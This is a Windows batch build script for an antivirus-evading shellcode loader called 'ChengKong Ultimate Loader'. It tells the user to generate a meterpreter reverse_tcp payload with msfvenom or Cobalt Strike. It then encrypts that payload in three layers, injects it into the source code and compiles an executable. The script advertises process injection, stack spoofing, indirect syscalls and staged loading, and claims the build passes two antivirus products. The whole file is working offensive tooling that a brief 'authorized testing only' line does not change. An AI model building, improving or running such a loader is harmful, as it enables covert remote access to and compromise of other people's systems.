@echo off
echo ========================================
echo ChengKong Ultimate Loader - Auto Build
echo Author: ChengKong
echo ========================================
echo.

REM Check if payload_x64.bin exists
if not exist "payload_x64.bin" (
    echo [ERROR] payload_x64.bin not found!
    echo.
    echo Please put your shellcode file in this directory:
    echo %cd%\payload_x64.bin
    echo.
    echo How to generate shellcode:
    echo   Cobalt Strike: Attacks ^> Packages ^> Windows Executable (S) ^> Raw
    echo   Metasploit: msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload_x64.bin
    echo.
    pause
    exit /b 1
)

echo [1/4] Found payload_x64.bin
for %%A in (payload_x64.bin) do echo       Size: %%~zA bytes
echo.

REM Check Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python not found!
    echo Please install Python 3.x from https://www.python.org/
    echo.
    pause
    exit /b 1
)

REM Check pycryptodome
python -c "from Crypto.Cipher import AES" >nul 2>&1
if %errorlevel% neq 0 (
    echo [WARNING] pycryptodome module not found
    echo [INFO] Installing pycryptodome...
    pip install pycryptodome
    if %errorlevel% neq 0 (
        echo [ERROR] Installation failed! Please run manually: pip install pycryptodome
        pause
        exit /b 1
    )
)

REM Step 1: Encrypt shellcode
echo [2/4] Encrypting shellcode...
cd tools
python advanced_encrypt_shellcode.py
if %errorlevel% neq 0 (
    echo [ERROR] Encryption failed!
    cd ..
    pause
    exit /b 1
)
cd ..
echo       OK: Shellcode encrypted successfully
echo       OK: Generated 3-layer encryption keys
echo.

REM Step 2: Update source code
echo [3/4] Updating source code...
cd tools
python update_shellcode.py
if %errorlevel% neq 0 (
    echo [ERROR] Source code update failed!
    cd ..
    pause
    exit /b 1
)
cd ..
echo       OK: Source code updated successfully
echo.

REM Step 3: Compile
echo [4/4] Compiling project...
cd src

REM Try to find MSBuild
set MSBUILD_PATH=
if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" (
    set MSBUILD_PATH=C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe" (
    set MSBUILD_PATH=C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe" (
    set MSBUILD_PATH=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe
) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe" (
    set MSBUILD_PATH=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe
) else (
    echo [ERROR] MSBuild not found!
    echo Please install Visual Studio 2019/2022
    echo Download: https://visualstudio.microsoft.com/
    cd ..
    pause
    exit /b 1
)

echo       Using MSBuild: %MSBUILD_PATH%
echo.

"%MSBUILD_PATH%" kong_ultimate.sln /p:Configuration=Release /p:Platform=x64 /t:Rebuild /v:minimal /nologo
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Compilation failed!
    echo.
    echo Possible reasons:
    echo   1. MASM (Microsoft Macro Assembler) not installed
    echo   2. Missing Windows SDK
    echo   3. Incomplete Visual Studio configuration
    echo.
    echo Solution:
    echo   Open Visual Studio Installer
    echo   Modify installation -^> Check "Desktop development with C++"
    echo   Make sure "MASM" component is checked
    echo.
    cd ..
    pause
    exit /b 1
)
cd ..
echo       OK: Compilation successful
echo.

REM Check output file
if exist "src\x64\Release\kong_ultimate.exe" (
    echo ========================================
    echo BUILD COMPLETE!
    echo ========================================
    echo.
    echo Output: src\x64\Release\kong_ultimate.exe
    for %%A in (src\x64\Release\kong_ultimate.exe) do echo Size: %%~zA bytes
    echo.
    echo How to run:
    echo   cd src\x64\Release
    echo   kong_ultimate.exe
    echo.
    echo ========================================
    echo Technical Features
    echo ========================================
    echo [+] Pool Party Injection
    echo [+] Stack Spoofing
    echo [+] Indirect Syscalls
    echo [+] 3-Layer Encryption (S-box + XOR + AES-128-CBC)
    echo [+] Staged Loading (128 bytes/chunk)
    echo [+] Random Delays (50-150ms)
    echo.
    echo ========================================
    echo Test Results
    echo ========================================
    echo [+] 360 Total Security: PASS
    echo [+] Huorong Security: PASS
    echo.
    echo WARNING: For authorized testing only!
    echo.
) else (
    echo [ERROR] Output file not found!
    echo Expected location: src\x64\Release\kong_ultimate.exe
    echo.
)

pause
